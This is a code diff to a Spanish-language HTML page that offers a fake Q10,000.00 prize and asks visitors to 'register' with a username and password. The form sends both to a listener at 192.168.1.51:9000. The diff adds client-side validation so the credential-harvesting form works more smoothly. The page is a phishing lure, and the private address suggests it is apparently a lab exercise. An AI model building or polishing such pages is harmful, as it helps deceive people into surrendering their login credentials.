@@ -3,11 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <title>Página de Registro</title>
+    <script>
+        function validateForm(event) {
+            // Obtiene los valores de los inputs
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+            
+            // Verifica si los campos están vacíos
+            if (!username || !password) {
+                // Muestra un mensaje de advertencia
+                alert("Por favor, complete todos los campos antes de enviar el formulario.");
+                
+                // Previene el envío del formulario
+                event.preventDefault();
+            }
+        }
+    </script>
 </head>
 <body>
     <h1>Felicidades, ganaste Q10,000.00</h1>
     <h1>Regístrate para poder reclamar tu premio</h1>
-    <form action="http://192.168.1.51:9000" method="POST">
+    <form action="http://192.168.1.51:9000" method="POST" onsubmit="validateForm(event)">
         <label for="username">Usuario:</label>
         <input type="text" id="username" name="username"><br><br>
         <label for="password">Contraseña:</label>
